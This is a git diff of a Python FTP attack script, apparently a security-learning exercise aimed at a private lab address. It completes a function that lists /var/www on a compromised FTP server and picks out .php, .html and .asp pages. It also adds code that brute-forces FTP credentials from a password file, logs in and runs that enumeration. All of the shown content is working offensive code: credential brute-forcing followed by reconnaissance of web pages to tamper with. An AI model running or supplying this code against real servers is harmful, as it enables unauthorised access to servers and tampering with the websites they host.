@@ -45,4 +45,33 @@ def bruteLogin(hostname, passwdFile):
 
 # takes an FTP connection as the input and returns an array of default pages it finds.
 def returnDefault(ftp):
-    pass
+    print(f"[+] Analyzing a vulnerable FTP server")
+    try:
+        ftp.cwd('/var/www')
+        # nlst lists the directory content
+        # nlst checks each file returned by the nlst agaisnt default web page file names
+        dirList = ftp.nlst()
+        print(f'[!] Found: {dirList}')
+    except:
+        dirList = []
+        print('[-] Could not list directory contents')
+        print('[-] Skipping to the Next target')
+        return
+
+    # lists to be retunre {key: value for key, value in variable}
+    retList = []
+
+    for fileName in dirList:
+        fn = fileName.lower()
+        if '.php' in fn or '.html' in fn or '.asp' in fn:
+            print(f"[+] Found default page: {fileName}")
+            retList.append(fileName)
+    return retList
+
+
+
+host = '192.168.52.128'
+username, password = bruteLogin(host, 'userpass.txt')
+ftp = ftplib.FTP(host)
+ftp.login(username, password)
+returnDefault(ftp)
